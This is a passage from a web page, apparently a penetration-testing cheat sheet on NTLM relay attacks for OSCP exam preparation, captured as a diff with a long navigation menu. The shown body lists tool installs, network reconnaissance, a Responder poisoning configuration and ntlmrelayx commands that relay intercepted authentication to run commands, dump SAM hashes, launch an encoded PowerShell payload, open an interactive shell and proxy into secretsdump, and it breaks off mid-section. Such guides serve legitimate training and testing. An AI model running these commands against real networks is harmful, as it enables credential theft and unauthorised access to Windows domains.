+          <li class="md-nav__item">
+  <a href="#step-1-configure-responder" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Configure Responder
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-start-responder" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Start Responder
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-start-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Start ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-trigger-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Trigger Authentication
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-2-ldapldaps-relay-dcsync-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 2: LDAP/LDAPS Relay (DCSync Attack)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 2: LDAP/LDAPS Relay (DCSync Attack)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#relay-to-ldap-for-acl-modifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relay to LDAP for ACL Modifications
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#after-escalation-perform-dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      After Escalation - Perform DCSync
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-3-mitm6-ntlmrelayx-ipv6-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 3: mitm6 + ntlmrelayx (IPv6 Attack)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 3: mitm6 + ntlmrelayx (IPv6 Attack)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-start-mitm6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Start mitm6
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-start-ntlmrelayx-with-wpad" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Start ntlmrelayx with WPAD
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-4-relay-to-specific-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 4: Relay to Specific Services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 4: Relay to Specific Services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#httpwebdav-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP/WebDAV Relay
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL Relay
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post-Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dump-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dump Credentials
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-backdoor-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create Backdoor Accounts
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#establish-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Establish Persistence
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivot-through-network" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pivot Through Network
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Strategy
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Strategy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-reconnaissance-5-10-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Reconnaissance (5-10 minutes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-setup-2-5-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Setup (2-5 minutes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-wait-and-exploit-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Wait and Exploit (Variable)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-post-exploitation-10-20-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 4: Post-Exploitation (10-20 minutes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-5-lateral-movement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 5: Lateral Movement
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Troubleshooting
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Issues
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense-and-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense and Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense and Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enable-smb-signing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enable SMB Signing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disable-llmnr-and-nbt-ns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Disable LLMNR and NBT-NS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enable-ldap-signing-and-channel-binding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enable LDAP Signing and Channel Binding
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ntlm-relay-with-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      NTLM Relay with Delegation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relay-with-shadow-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relay with Shadow Credentials
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multi-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Multi-Relay Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Reference Commands
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Reference Commands">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#essential-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Essential Commands
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cheat Sheet Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cheat Sheet Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pre-attack-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pre-Attack Checklist
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#key-ntlmrelayx-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key ntlmrelayx Options
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-exploitation-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation Tools
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Notes
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ntlm-relay-attack">NTLM Relay Attack</h1>
+<h2 id="overview">Overview</h2>
+<p>NTLM Relay attacks exploit the NTLM authentication protocol by intercepting and relaying authentication requests to target systems. This allows attackers to authenticate as legitimate users without knowing their passwords.</p>
+<hr />
+<h2 id="prerequisites">Prerequisites</h2>
+<h3 id="required-tools">Required Tools</h3>
+<ul>
+<li><strong>Responder</strong> - LLMNR/NBT-NS/MDNS poisoner</li>
+<li><strong>ntlmrelayx</strong> (Impacket) - NTLM relay tool</li>
+<li><strong>Proxychains</strong> (optional) - For pivoting</li>
+<li><strong>CrackMapExec</strong> - Post-exploitation and verification</li>
+<li><strong>mitm6</strong> - IPv6 DHCP spoofing for relay</li>
+</ul>
+<h3 id="installation">Installation</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Install Impacket</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>impacket-scripts
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c1"># OR from source</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/SecureAuthCorp/impacket.git
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">cd</span><span class="w"> </span>impacket
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>pip<span class="w"> </span>install<span class="w"> </span>.
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># Install Responder</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>responder
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c1"># OR from source</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/lgandx/Responder.git
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c1"># Install mitm6</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>mitm6
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="c1"># OR</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>pip<span class="w"> </span>install<span class="w"> </span>mitm6
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="c1"># Install CrackMapExec</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>crackmapexec
+</span></code></pre></div>
+<hr />
+<h2 id="understanding-ntlm-relay">Understanding NTLM Relay</h2>
+<h3 id="what-is-ntlm-relay">What is NTLM Relay?</h3>
+<p>NTLM Relay works by:</p>
+<ol>
+<li><strong>Intercepting</strong> authentication attempts (via LLMNR/NBT-NS poisoning or mitm6)</li>
+<li><strong>Relaying</strong> those credentials to target systems</li>
+<li><strong>Authenticating</strong> to services on behalf of the victim</li>
+<li><strong>Executing</strong> commands or dumping credentials</li>
+</ol>
+<h3 id="requirements-for-success">Requirements for Success</h3>
+<p>✅ <strong>SMB Signing must be disabled or not required</strong> on target
+✅ <strong>Valid network credentials</strong> being relayed
+✅ <strong>Relayed user must have admin rights</strong> on target (for most attacks)
+✅ <strong>Network connectivity</strong> between attacker and targets</p>
+<h3 id="common-attack-scenarios">Common Attack Scenarios</h3>
+<ol>
+<li><strong>SMB to SMB</strong> - Relay SMB auth to another SMB service</li>
+<li><strong>HTTP to SMB</strong> - Relay HTTP auth to SMB</li>
+<li><strong>LDAP to LDAP</strong> - Relay to domain controller LDAP</li>
+<li><strong>SMB to LDAPS</strong> - Relay to secure LDAP for DCSync</li>
+</ol>
+<hr />
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="step-1-identify-targets-without-smb-signing">Step 1: Identify Targets Without SMB Signing</h3>
+<p><strong>Using CrackMapExec:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>targets.txt
+</span></code></pre></div></p>
+<p><strong>Using Nmap:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nmap<span class="w"> </span>--script<span class="w"> </span>smb-security-mode.nse<span class="w"> </span>-p445<span class="w"> </span><span class="m">192</span>.168.1.0/24
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>nmap<span class="w"> </span>--script<span class="w"> </span>smb2-security-mode.nse<span class="w"> </span>-p445<span class="w"> </span><span class="m">192</span>.168.1.0/24
+</span></code></pre></div></p>
+<p><strong>Manual Check with Nmap:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmap<span class="w"> </span>-p445<span class="w"> </span>--script<span class="w"> </span>smb-security-mode<span class="w"> </span><span class="m">192</span>.168.1.100
+</span></code></pre></div></p>
+<p>Look for:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>| smb-security-mode:
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>|   account_used: guest
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>|   authentication_level: user
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>|   message_signing: disabled (dangerous, but default)
+</span></code></pre></div></p>
+<h3 id="step-2-identify-domain-controllers">Step 2: Identify Domain Controllers</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Using CrackMapExec</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>targets.txt
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Using Nmap</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>nmap<span class="w"> </span>-p389,636,3268,3269<span class="w"> </span><span class="m">192</span>.168.1.0/24
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># Using nslookup</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>nslookup<span class="w"> </span>-type<span class="o">=</span>SRV<span class="w"> </span>_ldap._tcp.dc._msdcs.DOMAIN.LOCAL
+</span></code></pre></div>
+<h3 id="step-3-network-discovery">Step 3: Network Discovery</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Identify live hosts</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.1.0/24
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># Identify Windows hosts</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># Enumerate shares</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<hr />
+<h2 id="attack-execution">Attack Execution</h2>
+<h3 id="method-1-smb-relay-with-responder-ntlmrelayx">Method 1: SMB Relay with Responder + ntlmrelayx</h3>
+<h4 id="step-1-configure-responder">Step 1: Configure Responder</h4>
+<p>Edit <code>/etc/responder/Responder.conf</code> or <code>/usr/share/responder/Responder.conf</code>:</p>
+<div class="language-ini highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">[Responder Core]</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1">; Servers to start</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="na">SQL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="na">SMB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">Off</span><span class="w">      </span><span class="c1"># Turn OFF to allow ntlmrelayx to handle SMB</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="na">HTTP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">Off</span><span class="w">     </span><span class="c1"># Turn OFF if relaying HTTP</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="na">HTTPS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="na">LDAP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="na">RDP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="na">Kerberos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="na">FTP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="na">POP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="na">SMTP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="na">IMAP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="na">DNS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="na">MDNS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">On</span>
+</span></code></pre></div>
+<h4 id="step-2-start-responder">Step 2: Start Responder</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Start Responder in analyze mode first (recommended)</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-A
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Start Responder for poisoning</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-dwv
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># Options:</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># -I eth0    : Interface</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="c1"># -d         : Enable DHCP poisoning</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="c1"># -w         : Enable WPAD rogue proxy</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="c1"># -v         : Verbose</span>
+</span></code></pre></div>
+<h4 id="step-3-start-ntlmrelayx">Step 3: Start ntlmrelayx</h4>
+<p><strong>Basic Relay (Command Execution):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Relay and execute commands</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># Relay and dump SAM hashes</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="c1"># Relay with specific command</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;powershell -enc &lt;base64_payload&gt;&quot;</span>
+</span></code></pre></div></p>
+<p><strong>Interactive Shell:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Get interactive shell</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-i
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c1"># Then connect: nc 127.0.0.1 11000</span>
+</span></code></pre></div></p>
+<p><strong>SOCKS Proxy:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Setup SOCKS proxy</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-socks
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># Use with proxychains</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>proxychains<span class="w"> </span>smbclient<span class="w"> </span>//192.168.1.100/C$
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>proxychains<span class="w"> </span>secretsdump.py<span class="w"> </span>DOMAIN/USER@192.168.1.100
+</span></code></pre></div></p>
+<p><strong>Advanced Options:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Relay to specific target</span>
